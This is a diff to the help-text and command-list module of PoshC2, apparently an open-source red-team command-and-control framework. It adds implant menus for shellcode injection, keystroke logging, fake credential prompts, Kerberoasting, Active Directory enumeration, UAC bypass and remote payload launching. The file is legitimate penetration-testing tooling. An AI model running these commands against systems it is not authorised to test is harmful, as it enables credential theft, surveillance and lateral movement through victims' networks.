@@ -1,13 +1,13 @@
 #!/usr/bin/python
 
-logopic = """__________            .__.     _________  ________  
- \_______  \____  _____|  |__   \_   ___ \ \_____  \ 
-  |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ 
-  |    |  (  <_> )___ \|   Y  \ \     \____/       \ 
-  |____|   \____/____  >___|  /  \______  /\_______ \  
+logopic = """ __________            .__.     _________  ________
+ \_______  \____  _____|  |__   \_   ___ \ \_____  \\
+  |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/
+  |    |  (  <_> )___ \|   Y  \ \     \____/       \\
+  |____|   \____/____  >___|  /  \______  /\_______ \\
                      \/     \/          \/         \/
-  =============== v4.5 www.PoshC2.co.uk ============="""
- 
+  =============== v4.6 www.PoshC2.co.uk ============="""
+
 
 py_help1 = """
 Implant Features:
@@ -32,6 +32,95 @@ unhide-implant
 help
 searchhelp mimikatz
 back
+label-implant <newlabel>
+linuxprivchecker
+"""
+
+sharp_help1 = """
+Implant Features:
+=====================
+ps
+beacon 60s / beacon 10m / beacon 2h
+turtle 60s / turtle 30m / turtle 8h
+ls c:\\temp\\
+ls-recurse c:\\temp\\
+get-content c:\\temp\\log.txt
+get-userinfo
+pwd
+delete c:\\temp\\test.exe
+move c:\\temp\\old.exe c:\\temp\\new.exe
+resolveip 127.0.0.1
+resolvednsname google.com
+loadmodule Seatbelt.exe
+loadmoduleforce
+listmodule
+modulesloaded
+run-exe Core.Program Core
+run-dll Seatbelt.Program Seatbelt UserChecks
+start-process net -argumentlist users
+download-file "c:\\temp\\test.exe"
+upload-file -source /tmp/test.exe -destination "c:\\temp\\test.exe"
+kill-implant
+hide-implant
+unhide-implant
+help
+searchhelp listmodules
+label-implant <newlabel>
+back
+
+Migration
+===========
+inject-shellcode c:\\windows\\system32\\svchost.exe <optional-ppid-spoofid>
+inject-shellcode 1453 <optional-ppid-spoofid>
+
+Privilege Escalation:
+=======================
+arpscan 172.16.0.1/24 true
+get-serviceperms c:\\temp\\
+get-screenshot
+get-screenshotmulti
+get-keystrokes c:\\temp\\logger.txt
+stop-keystrokes
+testadcredential domain username password
+testlocalcredential username password
+cred-popper
+loadmodule SharpUp.exe
+run-exe SharpUp.Program SharpUp
+
+Privilege Escalation:
+=======================
+loadmodule Seatbelt.exe
+run-exe Seatbelt.Program Seatbelt all
+run-exe Seatbelt.Program Seatbelt BasicOSInfo
+run-exe Seatbelt.Program Seatbelt SysmonConfig
+run-exe Seatbelt.Program Seatbelt PowerShellSettings
+run-exe Seatbelt.Program Seatbelt RegistryAutoRuns
+
+Network Tasks / Lateral Movement:
+====================================
+loadmodule Rubeus.exe
+run-exe Rubeus.Program Rubeus kerberoast
+run-exe Rubeus.Program Rubeus asreproast /user:username
+
+Network Tasks / Lateral Movement:
+====================================
+loadmodule SharpView.exe
+run-exe SharpView.Program SharpView Get-NetUser -SamAccountName ben
+run-exe SharpView.Program SharpView Get-NetGroup -Name *admin* -Domain -Properties samaccountname,member -Recurse
+run-exe SharpView.Program SharpView Get-NetGroupMember -LDAPFilter GroupName=*Admins* -Recurse -Properties samaccountname
+run-exe SharpView.Program SharpView Get-NetUser -Name deb -Domain blorebank.local
+run-exe SharpView.Program SharpView Get-NetSession -Domain blorebank.local
+run-exe SharpView.Program SharpView Get-DomainController -Domain blorebank.local
+run-exe SharpView.Program SharpView Get-DomainUser -LDAPFilter samaccountname=ben -Properties samaccountname,mail
+run-exe SharpView.Program SharpView Get-DomainUser -AdminCount -Properties samaccountname
+run-exe SharpView.Program SharpView Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties samaccountname
+run-exe SharpView.Program Sharpview Find-InterestingFile -Path c:\users\ -Include *exe*
+run-exe SharpView.Program SharpView Find-InterestingDomainShareFile -ComputerName SERVER01
+
+Bloodhound:
+=============
+loadmodule SharpHound.exe
+run-exe Sharphound2.Sharphound Sharphound --ZipFileName c:\\temp\\test.zip --JsonFolder c:\\temp\\
 """
 
 posh_help1 = """
@@ -39,6 +128,7 @@ Implant Features:
 =====================
 ps
 searchhelp mimikatz
+label-implant <newlabel>
 get-hash
 unhidefile
 hidefile
@@ -49,7 +139,6 @@ turtle 60s / turtle 30m / turtle 8h
 kill-implant
 hide-implant
 unhide-implant
-invoke-enum
 get-proxy
 get-computerinfo
 unzip <source file> <destination folder>
@@ -97,7 +186,7 @@ posh_help2 = """
 Privilege Escalation:
 ====================
 invoke-allchecks
-Invoke-PsUACme -Payload "c:\\temp\\uac.exe" -method sysprep 
+Invoke-PsUACme -Payload "c:\\temp\\uac.exe" -method sysprep
 get-mshotfixes | where-object {$_.hotfixid -eq "kb2852386"}
 invoke-ms16-032
 invoke-ms16-032-proxypayload
@@ -143,6 +232,7 @@ posh_help4 = """
 Active Directory Enumeration:
 ==================
 invoke-aclscanner
+invoke-aclscanner | Where-Object {$_.IdentityReference -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
 get-objectacl -resolveguids -samaccountname john
 add-objectacl -targetsamaccountname arobbins -principalsamaccountname harmj0y -rights resetpassword
 get-netuser -admincount | select samaccountname
@@ -288,14 +378,14 @@ exit
 
 
 pre_help = """
-Main Menu: 
+Main Menu:
 ================================
 use implant by <id>, e.g. 1
 use multiple implants by <id>,<id>,<id>, e.g. 1,2,5
 use implant by range, e.g. 40-45
 use all implants by all
 
-Auto-Runs: 
+Auto-Runs:
 =====================
 add-autorun <task>
 list-autorun (alias: l)
@@ -303,14 +393,14 @@ del-autorun <taskid>
 nuke-autorun
 automigrate-frompowershell (alias: am)
 
-Server Commands: 
+Server Commands:
 =====================
 tasks
 opsec
 show-urls
 list-urls
 cleartasks
-show-serverinfo 
+show-serverinfo
 history
 output-to-html
 set-clockworksmsapikey df2
@@ -318,17 +408,16 @@ set-clockworksmsnumber 44789
 set-defaultbeacon 60
 turnon-notifications
 turnoff-notifications
-listmodules 
+listmodules
 pwnself (alias: p)
-creds -action <dump/add/del/search> -username <username> -password/-hash 
+creds -action <dump/add/del/search> -username <username> -password/-hash
 createnewpayload
-createproxypayload 
+createproxypayload
 createdaisypayload
-quit 
+quit
 """
 
 posh_help = posh_help1 + posh_help2 + posh_help3 + posh_help4 + posh_help5 + posh_help6 + posh_help7 + posh_help8
-
 
 # pre help commands
 PRECOMMANDS = ['list-urls','show-urls', 'add-autorun' ,'list-autorun','del-autorun', 'nuke-autorun','automigrate-frompowershell',
@@ -336,7 +425,7 @@ PRECOMMANDS = ['list-urls','show-urls', 'add-autorun' ,'list-autorun','del-autor
 'listmodules','pwnself','creds','createnewpayload','createproxypayload','listmodules',
 'createdaisypayload','turnoff-notifications','turnon-notifications','tasks','cleartasks',"opsec"]
 
-# post help commands
+# post help commands powershell implant
 COMMANDS = ['loadmodule',"bloodhound","brute-ad","brute-locadmin",
 "bypass-uac","cve-2016-9192","convertto-shellcode","decrypt-rdcman","dump-ntds","get-computerinfo","get-creditcarddata","get-gppautologon",
 "get-gpppassword","get-idletime","get-keystrokes","get-locadm","get-mshotfixes","get-netstat","get-passnotexp","get-passpol","get-recentfiles",
@@ -346,24 +435,28 @@ COMMANDS = ['loadmodule',"bloodhound","brute-ad","brute-locadmin",
 "invoke-runas","invoke-smbexec","invoke-shellcode","invoke-sniffer","invoke-sqlquery","invoke-tater","invoke-thehash",
 "invoke-tokenmanipulation","invoke-wmichecker","invoke-wmicommand","invoke-wmiexec","invoke-wscriptbypassuac","invoke-winrmsession",
 "out-minidump","portscan","invoke-allchecks","set-lhstokenprivilege","sharpsocks","find-allvulns","test-adcredential","new-zipfile",
-"get-netuser","sleep","beacon","setbeacon","get-screenshot", "install-persistence","hide-implant","unhide-implant","kill-implant","invoke-runasdaisypayload", 
+"get-netuser","sleep","beacon","setbeacon","get-screenshot", "install-persistence","hide-implant","unhide-implant","kill-implant","invoke-runasdaisypayload",
 "invoke-runasproxypayload", "invoke-runaspayload","migrate","$psversiontable","back", "clear","invoke-daisychain","stop-daisy",
 "ipconfig","upload-file","download-file","download-files","history","get-help","stopsocks","get-screenshotallwindows",
-"hashdump","cred-popper","help","whoami","createnewpayload","createproxypayload","createdaisypayload",
-"get-proxy","restart-computer","turtle","posh-delete","get-idletime","get-psdrive",
-"get-netcomputer","get-netdomain","get-netforest","get-netforesttrust","get-forestdomain",
-"test-connection","get-netdomaincontroller","invoke-pbind","pbind-command",
-"invoke-kerberoast","invoke-userhunter","get-process","start-process",
-"searchhelp","get-netshare","pbind-kill","install-servicelevel-persistencewithproxy",
-"install-servicelevel-persistence","remove-servicelevel-persistence","reversedns",
-"invoke-eternalblue","loadmoduleforce","unhook-amsi","get-implantworkingdirectory","get-system",
-"get-system-withproxy","get-system-withdaisy","get-pid","listmodules","modulesloaded",
-"startanotherimplant","remove-persistence","removeexe-persistence","installexe-persistence",
-"get-hash","get-creds","resolve-ipaddress","invoke-wmievent","remove-wmievent","get-wmievent",
-"invoke-smbclient","get-keystrokedata","unhidefile","hidefile"]
+"hashdump","cred-popper","help","whoami","createnewpayload","createproxypayload","createdaisypayload","get-proxy","restart-computer",
+"turtle","posh-delete","get-idletime","get-psdrive","get-netcomputer","get-netdomain","get-netforest","get-netforesttrust",
+"get-forestdomain","test-connection","get-netdomaincontroller","invoke-pbind","pbind-command","invoke-kerberoast","invoke-userhunter",
+"get-process","start-process","searchhelp","get-netshare","pbind-kill","install-servicelevel-persistencewithproxy",
+"install-servicelevel-persistence","remove-servicelevel-persistence","reversedns","invoke-eternalblue","loadmoduleforce","unhook-amsi",
+"get-implantworkingdirectory","get-system","get-system-withproxy","get-system-withdaisy","get-pid","listmodules","modulesloaded",
+"startanotherimplant","remove-persistence","removeexe-persistence","installexe-persistence","get-hash","get-creds","resolve-ipaddress",
+"invoke-wmievent","remove-wmievent","get-wmievent","invoke-smbclient","get-keystrokedata","unhidefile","hidefile", "label-implant",
+'invoke-psexecpayload','invoke-wmipayload','invoke-dcompayload','invoke-psexecproxypayload','invoke-wmiproxypayload',
+'invoke-dcomproxypayload','invoke-psexecdaisypayload','invoke-wmidaisypayload', 'invoke-dcomdaisypayload']
 
-COMMANDS += ['invoke-psexecpayload','invoke-wmipayload', 'invoke-dcompayload']
-COMMANDS += ['invoke-psexecproxypayload','invoke-wmiproxypayload', 'invoke-dcomproxypayload']
-COMMANDS += ['invoke-psexecdaisypayload','invoke-wmidaisypayload', 'invoke-dcomdaisypayload']
+# post help commands python implant
+UXCOMMANDS = ["label-implant", "unhide-implant","hide-implant","help","searchhelp","python","loadmodule",
+"loadmoduleforce","get-keystrokes","back","upload-file","download-file","install-persistence","remove-persistence","sai",
+"startanotherimplant-keepfile","get-screenshot","startanotherimplant","pwd","id","ps","setbeacon","kill-implant","linuxprivchecker"]
 
-UXCOMMANDS = ["unhide-implant","hide-implant","help","searchhelp","python","loadmodule","loadmoduleforce","get-keystrokes","back","upload-file","download-file","install-persistence","remove-persistence","sai","startanotherimplant-keepfile","get-screenshot","startanotherimplant","pwd","id","ps","setbeacon","kill-implant"]
+# post help commands sharp implant
+SHARPCOMMANDS = ["get-userinfo","stop-keystrokes","get-keystrokes","delete","move","label-implant","upload-file",
+"download-file","get-content","ls-recurse","turtle","cred-popper","resolveip","resolvednsname","testadcredential",
+"testlocalcredential","get-screenshot","modulesloaded","get-serviceperms","unhide-implant","arpscan","ls","pwd","dir",
+"inject-shellcode","start-process","run-exe","run-dll","hide-implant","help","searchhelp","listmodules","loadmodule",
+"loadmoduleforce","back","ps","beacon","setbeacon","kill-implant","get-screenshotmulti"]
